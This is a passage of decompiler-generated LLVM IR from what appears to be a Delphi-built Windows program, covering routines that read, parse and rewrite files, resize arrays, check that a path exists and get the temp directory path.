  %61 = and i8 %58, %60, !insn.addr !1506
  store i8 %61, i8* %57, align 1, !insn.addr !1506
  %62 = add i32 %arg6, 105, !insn.addr !1507
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1507
  %64 = load i8, i8* %63, align 1, !insn.addr !1507
  %65 = and i8 %64, %35, !insn.addr !1507
  store i8 %65, i8* %63, align 1, !insn.addr !1507
  %66 = inttoptr i32 %54 to i8*, !insn.addr !1508
  %67 = load i8, i8* %66, align 1, !insn.addr !1508
  %factor = mul i8 %49, 2
  %68 = add i8 %67, %factor, !insn.addr !1509
  store i8 %68, i8* %66, align 1, !insn.addr !1509
  %69 = inttoptr i32 %arg2 to i32*, !insn.addr !1510
  %70 = load i32, i32* %69, align 4, !insn.addr !1510
  %71 = add i32 %70, %arg6, !insn.addr !1510
  store i32 %71, i32* %69, align 4, !insn.addr !1510
  %72 = load i8, i8* %66, align 1, !insn.addr !1511
  %73 = add i8 %72, %49, !insn.addr !1511
  store i8 %73, i8* %66, align 1, !insn.addr !1511
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1512
  %74 = call i32 @__readfsdword(i32 0), !insn.addr !1513
  store i32 %74, i32* %stack_var_16, align 4, !insn.addr !1513
  %75 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1513
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1514
  %76 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1515
  %77 = add i32 %76, 1, !insn.addr !1515
  %78 = icmp eq i32 %77, 0, !insn.addr !1515
  store i32 %77, i32* @global_var_4096d4, align 4, !insn.addr !1515
  %79 = icmp eq i1 %78, false, !insn.addr !1516
  br i1 %79, label %dec_label_pc_40683f, label %dec_label_pc_406835, !insn.addr !1516

dec_label_pc_406835:                              ; preds = %dec_label_pc_40680e
  %80 = call i32 @"@LStrClr"(), !insn.addr !1517
  br label %dec_label_pc_40683f, !insn.addr !1517

dec_label_pc_40683f:                              ; preds = %dec_label_pc_406835, %dec_label_pc_40680e
  %81 = load i32, i32* %stack_var_16, align 4, !insn.addr !1518
  call void @__writefsdword(i32 0, i32 %81), !insn.addr !1519
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1519
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1519
  br label %dec_label_pc_406847, !insn.addr !1519

dec_label_pc_406847:                              ; preds = %dec_label_pc_40683f, %dec_label_pc_4067f6
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %82 = add i32 %esp.0, -4, !insn.addr !1520
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1520
  store i32 4221012, i32* %83, align 4, !insn.addr !1520
  ret i32 %eax.0.reload, !insn.addr !1521

dec_label_pc_406865:                              ; preds = %dec_label_pc_4067ed
  %84 = mul i32 %4, 2, !insn.addr !1522
  %85 = add i32 %1, 105, !insn.addr !1522
  %86 = add i32 %85, %84, !insn.addr !1522
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1522
  %88 = load i32, i32* %87, align 4, !insn.addr !1522
  %89 = or i32 %88, %3, !insn.addr !1522
  store i32 %89, i32* %87, align 4, !insn.addr !1522
  %90 = call i32 @"@LStrCat3"(), !insn.addr !1523
  %91 = call i32 @function_4036c8(), !insn.addr !1524
  %92 = inttoptr i32 %91 to i8*, !insn.addr !1525
  store i8* %92, i8** %stack_var_-8, align 4, !insn.addr !1525
  %93 = ptrtoint i8** %stack_var_-8 to i32, !insn.addr !1525
  %94 = call i32* @CreateFileA(i8* %92, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1526
  %95 = icmp eq i32* %94, inttoptr (i32 -1 to i32*), !insn.addr !1527
  store i32 %93, i32* %esp.2.reg2mem, !insn.addr !1528
  br i1 %95, label %dec_label_pc_406a47, label %dec_label_pc_406912, !insn.addr !1528

dec_label_pc_40687c:                              ; preds = %dec_label_pc_406805
  ret i32 %26, !insn.addr !1529

dec_label_pc_40687d:                              ; preds = %dec_label_pc_40680a
  %96 = inttoptr i32 %54 to i8*, !insn.addr !1530
  %97 = load i8, i8* %96, align 1, !insn.addr !1530
  %98 = trunc i32 %arg3 to i8, !insn.addr !1531
  %99 = add i8 %49, %98, !insn.addr !1530
  %100 = add i8 %99, %97, !insn.addr !1531
  store i8 %100, i8* %96, align 1, !insn.addr !1531
  %101 = add i32 %54, 1, !insn.addr !1532
  %102 = mul i32 %101, 2, !insn.addr !1533
  %103 = inttoptr i32 %102 to i8*, !insn.addr !1533
  %104 = load i8, i8* %103, align 2, !insn.addr !1533
  %105 = trunc i32 %101 to i8, !insn.addr !1533
  %106 = add i8 %104, %105, !insn.addr !1533
  store i8 %106, i8* %103, align 2, !insn.addr !1533
  %107 = inttoptr i32 %101 to i8*, !insn.addr !1534
  %108 = load i8, i8* %107, align 1, !insn.addr !1534
  %109 = add i8 %108, %105, !insn.addr !1534
  store i8 %109, i8* %107, align 1, !insn.addr !1534
  ret i32 %101, !insn.addr !1535

dec_label_pc_406912:                              ; preds = %dec_label_pc_406865
  %110 = ptrtoint i32* %94 to i32, !insn.addr !1526
  store i32 %110, i32* %stack_var_-16, align 4, !insn.addr !1536
  %111 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1536
  %112 = call i32 @GetFileSize(i32* null, i32* %94), !insn.addr !1537
  %113 = inttoptr i32 %2 to i32*, !insn.addr !1538
  store i32 %112, i32* %113, align 4, !insn.addr !1538
  %114 = add i32 %2, 1
  %115 = icmp ult i32 %114, 2
  store i32 %111, i32* %esp.2.reg2mem, !insn.addr !1539
  br i1 %115, label %dec_label_pc_406a47, label %dec_label_pc_40692e, !insn.addr !1539

dec_label_pc_40692e:                              ; preds = %dec_label_pc_406912
  %116 = call i32 @"@LStrSetLength"(), !insn.addr !1540
  %117 = call i32 @function_403720(), !insn.addr !1541
  %118 = inttoptr i32 %117 to i32*, !insn.addr !1542
  %119 = call i1 @ReadFile(i32* %118, i32* %94, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1542
  store i32 %110, i32* %stack_var_-40, align 4, !insn.addr !1543
  %120 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1543
  %121 = call i1 @CloseHandle(i32* %94), !insn.addr !1544
  %122 = call i32 @function_4046d4(), !insn.addr !1545
  %123 = add i32 %0, -12, !insn.addr !1546
  %124 = inttoptr i32 %123 to i32*, !insn.addr !1546
  %125 = load i32, i32* %124, align 4, !insn.addr !1546
  %126 = icmp eq i32 %125, 0, !insn.addr !1546
  %127 = icmp eq i1 %126, false, !insn.addr !1547
  store i32 %120, i32* %esp.1.lcssa.reg2mem, !insn.addr !1547
  br i1 %127, label %dec_label_pc_406978.lr.ph, label %dec_label_pc_406a40, !insn.addr !1547

dec_label_pc_406978.lr.ph:                        ; preds = %dec_label_pc_40692e
  %128 = add i32 %0, -16
  %129 = add i32 %0, -20
  %130 = add i32 %0, -24
  %131 = inttoptr i32 %129 to i32*
  %132 = inttoptr i32 %130 to i32*
  store i32 %120, i32* %esp.13.reg2mem
  br label %dec_label_pc_406978

dec_label_pc_406978:                              ; preds = %dec_label_pc_406978.lr.ph, %dec_label_pc_406a36.backedge
  %esp.13.reload = load i32, i32* %esp.13.reg2mem
  %133 = call i32 @"@LStrPos"(), !insn.addr !1548
  store i32 %133, i32* %113, align 4, !insn.addr !1549
  %134 = add i32 %esp.13.reload, -4, !insn.addr !1550
  %135 = inttoptr i32 %134 to i32*, !insn.addr !1550
  store i32 %128, i32* %135, align 4, !insn.addr !1550
  %136 = call i32 @"@LStrCopy"(), !insn.addr !1551
  %137 = call i32 @"@LStrDelete"(), !insn.addr !1552
  %138 = call i32 @"@LStrPos"(), !insn.addr !1553
  store i32 %138, i32* %113, align 4, !insn.addr !1554
  %139 = add i32 %esp.13.reload, -8, !insn.addr !1555
  %140 = inttoptr i32 %139 to i32*, !insn.addr !1555
  store i32 %129, i32* %140, align 4, !insn.addr !1555
  %141 = call i32 @"@LStrCopy"(), !insn.addr !1556
  %142 = add i32 %esp.13.reload, -12, !insn.addr !1557
  %143 = inttoptr i32 %142 to i32*, !insn.addr !1557
  store i32 %130, i32* %143, align 4, !insn.addr !1557
  %144 = call i32 @function_4034c8(), !insn.addr !1558
  %145 = call i32 @"@LStrCopy"(), !insn.addr !1559
  %146 = load i32, i32* %131, align 4, !insn.addr !1560
  %147 = icmp eq i32 %146, 0, !insn.addr !1560
  br i1 %147, label %dec_label_pc_406a36.backedge, label %dec_label_pc_4069e9, !insn.addr !1561

dec_label_pc_406a36.backedge:                     ; preds = %dec_label_pc_406978, %dec_label_pc_4069e9, %dec_label_pc_4069ef
  %148 = load i32, i32* %124, align 4, !insn.addr !1546
  %149 = icmp eq i32 %148, 0, !insn.addr !1546
  %150 = icmp eq i1 %149, false, !insn.addr !1547
  store i32 %142, i32* %esp.13.reg2mem, !insn.addr !1547
  store i32 %142, i32* %esp.1.lcssa.reg2mem, !insn.addr !1547
  br i1 %150, label %dec_label_pc_406978, label %dec_label_pc_406a40, !insn.addr !1547

dec_label_pc_4069e9:                              ; preds = %dec_label_pc_406978
  %151 = load i32, i32* %132, align 4, !insn.addr !1562
  %152 = icmp eq i32 %151, 0, !insn.addr !1562
  br i1 %152, label %dec_label_pc_406a36.backedge, label %dec_label_pc_4069ef, !insn.addr !1563

dec_label_pc_4069ef:                              ; preds = %dec_label_pc_4069e9
  %153 = call i32 @function_403c88(), !insn.addr !1564
  %154 = add i32 %153, 1, !insn.addr !1565
  %155 = add i32 %esp.13.reload, -16, !insn.addr !1566
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1566
  store i32 %154, i32* %156, align 4, !insn.addr !1566
  %157 = call i32 @"@DynArraySetLength"(), !insn.addr !1567
  %158 = call i32 @function_403c90(), !insn.addr !1568
  %159 = call i32 @"@LStrAsg"(), !insn.addr !1569
  %160 = call i32 @function_403c90(), !insn.addr !1570
  %161 = call i32 @"@LStrAsg"(), !insn.addr !1571
  br label %dec_label_pc_406a36.backedge, !insn.addr !1571

dec_label_pc_406a40:                              ; preds = %dec_label_pc_406a36.backedge, %dec_label_pc_40692e
  %esp.1.lcssa.reload = load i32, i32* %esp.1.lcssa.reg2mem
  %162 = add i32 %0, -4, !insn.addr !1572
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1572
  store i32 -1, i32* %163, align 4, !insn.addr !1572
  store i32 %esp.1.lcssa.reload, i32* %esp.2.reg2mem, !insn.addr !1572
  br label %dec_label_pc_406a47, !insn.addr !1572

dec_label_pc_406a47:                              ; preds = %dec_label_pc_406a40, %dec_label_pc_406912, %dec_label_pc_406865
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %164 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1573
  %165 = load i32, i32* %164, align 4, !insn.addr !1573
  call void @__writefsdword(i32 0, i32 %165), !insn.addr !1574
  %166 = add i32 %esp.2.reload, 8, !insn.addr !1575
  %167 = inttoptr i32 %166 to i32*, !insn.addr !1575
  store i32 4221545, i32* %167, align 4, !insn.addr !1575
  %168 = call i32 @"@LStrArrayClr"(), !insn.addr !1576
  ret i32 %168, !insn.addr !1577
}

define i32 @function_406a62() local_unnamed_addr {
dec_label_pc_406a62:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1578
  ret i32 %0, !insn.addr !1578
}

define i32 @function_406a67() local_unnamed_addr {
dec_label_pc_406a67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1579
}

define i32 @function_406a69(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406a69:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1580
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1580
  %3 = load i32, i32* %2, align 4, !insn.addr !1580
  ret i32 %3, !insn.addr !1581
}

define i32 @function_406aa0() local_unnamed_addr {
dec_label_pc_406aa0:
  %esp.2.reg2mem = alloca i32, !insn.addr !1582
  %esp.1.reg2mem = alloca i32, !insn.addr !1582
  %esi.0.reg2mem = alloca i32, !insn.addr !1582
  %esp.0.reg2mem = alloca i32, !insn.addr !1582
  %ebx.0.reg2mem = alloca i32, !insn.addr !1582
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1583
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1584
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1584
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1584
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1585
  %2 = call i32 @function_403c88(), !insn.addr !1586
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1587
  br i1 %3, label %dec_label_pc_406b89, label %dec_label_pc_406ace, !insn.addr !1587

dec_label_pc_406ace:                              ; preds = %dec_label_pc_406aa0
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1588
  %5 = call i32 @function_4036c8(), !insn.addr !1589
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1590
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1590
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1590
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1591
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1592
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1593
  br i1 %9, label %dec_label_pc_406b89, label %dec_label_pc_406b0a, !insn.addr !1593

dec_label_pc_406b0a:                              ; preds = %dec_label_pc_406ace
  %10 = call i32 @"@LStrClr"(), !insn.addr !1594
  %11 = call i32 @function_403c90(), !insn.addr !1595
  %12 = icmp slt i32 %11, 0, !insn.addr !1596
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1597
  br i1 %12, label %dec_label_pc_406b54, label %dec_label_pc_406b22, !insn.addr !1597

dec_label_pc_406b22:                              ; preds = %dec_label_pc_406b0a
  %13 = add i32 %11, 1, !insn.addr !1598
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1599
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1599
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1599
  br label %dec_label_pc_406b25, !insn.addr !1599

dec_label_pc_406b25:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b22
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1600
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1600
  store i32 0, i32* %15, align 4, !insn.addr !1600
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1601
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1602
  %18 = add i32 %16, %17, !insn.addr !1602
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1602
  %20 = load i32, i32* %19, align 4, !insn.addr !1602
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1602
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1602
  store i32 %20, i32* %22, align 4, !insn.addr !1602
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1603
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1603
  store i32 ptrtoint (i32* @global_var_406bd0 to i32), i32* %24, align 4, !insn.addr !1603
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1604
  %26 = or i32 %17, 4, !insn.addr !1605
  %27 = add i32 %25, %26, !insn.addr !1605
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1605
  %29 = load i32, i32* %28, align 4, !insn.addr !1605
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1605
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1605
  store i32 %29, i32* %31, align 4, !insn.addr !1605
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1606
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1606
  store i32 ptrtoint ([3 x i8]* @global_var_406bdc to i32), i32* %33, align 4, !insn.addr !1606
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1607
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1608
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1609
  %37 = icmp eq i32 %36, 0, !insn.addr !1609
  %38 = icmp eq i1 %37, false, !insn.addr !1610
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1610
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1610
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1610
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1610
  br i1 %38, label %dec_label_pc_406b25, label %dec_label_pc_406b54, !insn.addr !1610

dec_label_pc_406b54:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b0a
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1591
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1611
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1612
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1612
  store i32 0, i32* %42, align 4, !insn.addr !1612
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1613
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1613
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1613
  store i32 %45, i32* %44, align 4, !insn.addr !1613
  %46 = call i32 @function_4034c8(), !insn.addr !1614
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1615
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1615
  store i32 %46, i32* %48, align 4, !insn.addr !1615
  %49 = call i32 @function_403720(), !insn.addr !1616
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1617
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1617
  store i32 %49, i32* %51, align 4, !insn.addr !1617
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1618
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1618
  store i32 %39, i32* %53, align 4, !insn.addr !1618
  %54 = call i32 @function_40446c(), !insn.addr !1619
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1620
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1620
  store i32 %39, i32* %56, align 4, !insn.addr !1620
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1621
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1622
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1622
  store i32 %39, i32* %59, align 4, !insn.addr !1622
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1623
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1624
  br label %dec_label_pc_406b89, !insn.addr !1624

dec_label_pc_406b89:                              ; preds = %dec_label_pc_406b54, %dec_label_pc_406ace, %dec_label_pc_406aa0
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1625
  %62 = load i32, i32* %61, align 4, !insn.addr !1625
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1626
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1627
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1627
  store i32 4221867, i32* %64, align 4, !insn.addr !1627
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1628
  ret i32 %65, !insn.addr !1629
}

define i32 @function_406ba4() local_unnamed_addr {
dec_label_pc_406ba4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1630
  ret i32 %0, !insn.addr !1630
}

define i32 @function_406ba9() local_unnamed_addr {
dec_label_pc_406ba9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1631
}

define i32 @function_406bab(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1632
}

define i32 @function_406be0() local_unnamed_addr {
dec_label_pc_406be0:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1633
  %1 = call i32 @function_4036b8(), !insn.addr !1634
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1635
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1635
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1635
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1636
  %4 = call i32 @function_403c90(), !insn.addr !1637
  %5 = icmp slt i32 %4, 0, !insn.addr !1638
  br i1 %5, label %dec_label_pc_406c68, label %dec_label_pc_406c36, !insn.addr !1639

dec_label_pc_406c36:                              ; preds = %dec_label_pc_406be0
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1640
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1641
  br label %dec_label_pc_406cb4

dec_label_pc_406c68:                              ; preds = %dec_label_pc_406be0
  %8 = call i32 @function_403c88(), !insn.addr !1642
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1643
  %10 = call i32 @function_403c90(), !insn.addr !1644
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1645
  %12 = call i32 @function_403c90(), !insn.addr !1646
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1647
  %14 = call i32 @function_406aa0(), !insn.addr !1648
  br label %dec_label_pc_406cb4, !insn.addr !1648

dec_label_pc_406cb4:                              ; preds = %dec_label_pc_406c36, %dec_label_pc_406c68
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1649
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1650
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1651
  ret i32 %16, !insn.addr !1652
}

define i32 @function_406ccf() local_unnamed_addr {
dec_label_pc_406ccf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1653
  ret i32 %0, !insn.addr !1653
}

define i32 @function_406cd4() local_unnamed_addr {
dec_label_pc_406cd4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1654
}

define i32 @function_406cd6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406cd6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1655
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1655
  %3 = load i32, i32* %2, align 4, !insn.addr !1655
  ret i32 %3, !insn.addr !1656
}

define i32 @function_406ce0() local_unnamed_addr {
dec_label_pc_406ce0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1657
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1657
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1657
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1658
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1659
  %3 = add i32 %2, 1, !insn.addr !1659
  %4 = icmp eq i32 %3, 0, !insn.addr !1659
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1659
  %5 = icmp eq i1 %4, false, !insn.addr !1660
  br i1 %5, label %dec_label_pc_406d18, label %dec_label_pc_406cf9, !insn.addr !1660

dec_label_pc_406cf9:                              ; preds = %dec_label_pc_406ce0
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1661
  %7 = icmp eq i32 %6, 0, !insn.addr !1661
  br i1 %7, label %dec_label_pc_406d08, label %dec_label_pc_406d03, !insn.addr !1662

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cf9
  %8 = call i32 @function_406aa0(), !insn.addr !1663
  br label %dec_label_pc_406d08, !insn.addr !1663

dec_label_pc_406d08:                              ; preds = %dec_label_pc_406d03, %dec_label_pc_406cf9
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1664
  br label %dec_label_pc_406d18, !insn.addr !1664

dec_label_pc_406d18:                              ; preds = %dec_label_pc_406d08, %dec_label_pc_406ce0
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1665
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1666
  ret i32 0, !insn.addr !1667
}

define i32 @function_406d26() local_unnamed_addr {
dec_label_pc_406d26:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1668
  ret i32 %0, !insn.addr !1668
}

define i32 @function_406d2b() local_unnamed_addr {
dec_label_pc_406d2b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1669
}

define i32 @function_406d2d(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1670
}

define i32 @function_406d30() local_unnamed_addr {
dec_label_pc_406d30:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1671
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1671
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1671
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1672
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1673
  %3 = add i32 %2, -1, !insn.addr !1673
  %4 = icmp eq i32 %2, 0, !insn.addr !1673
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1673
  %5 = icmp eq i1 %4, false, !insn.addr !1674
  br i1 %5, label %dec_label_pc_406d64, label %dec_label_pc_406d4a, !insn.addr !1674

dec_label_pc_406d4a:                              ; preds = %dec_label_pc_406d30
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1675
  br label %dec_label_pc_406d64, !insn.addr !1676

dec_label_pc_406d64:                              ; preds = %dec_label_pc_406d4a, %dec_label_pc_406d30
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1677
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1678
  ret i32 0, !insn.addr !1679
}

define i32 @function_406d72() local_unnamed_addr {
dec_label_pc_406d72:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1680
  ret i32 %0, !insn.addr !1680
}

define i32 @function_406d77() local_unnamed_addr {
dec_label_pc_406d77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1681
}

define i32 @function_406d79(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d79:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1682
}

define i1 @function_406d7c(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406d7c:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1683
  ret i1 %0, !insn.addr !1683
}

define i32 @function_406d84() local_unnamed_addr {
dec_label_pc_406d84:
  %eax.0.reg2mem = alloca i32, !insn.addr !1684
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1685
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1686
  %2 = icmp eq i32 %1, 0, !insn.addr !1687
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1688
  br i1 %2, label %dec_label_pc_406dba, label %dec_label_pc_406d9c, !insn.addr !1688

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d84
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1685
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1689
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1689
  %7 = load i8, i8* %6, align 1, !insn.addr !1689
  %8 = icmp eq i8 %7, 92, !insn.addr !1689
  br i1 %8, label %dec_label_pc_406dac, label %dec_label_pc_406da3, !insn.addr !1690

dec_label_pc_406da3:                              ; preds = %dec_label_pc_406d9c
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1691
  store i8 92, i8* %9, align 1, !insn.addr !1691
  %10 = or i32 %3, 1, !insn.addr !1692
  %11 = add i32 %1, %10, !insn.addr !1692
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1692
  store i8 0, i8* %12, align 1, !insn.addr !1692
  br label %dec_label_pc_406dac, !insn.addr !1692

dec_label_pc_406dac:                              ; preds = %dec_label_pc_406da3, %dec_label_pc_406d9c
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1693
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1693
  br label %dec_label_pc_406dba, !insn.addr !1693

dec_label_pc_406dba:                              ; preds = %dec_label_pc_406dac, %dec_label_pc_406d84
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1694
}

define i32 @function_406dc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406dc4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1695
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
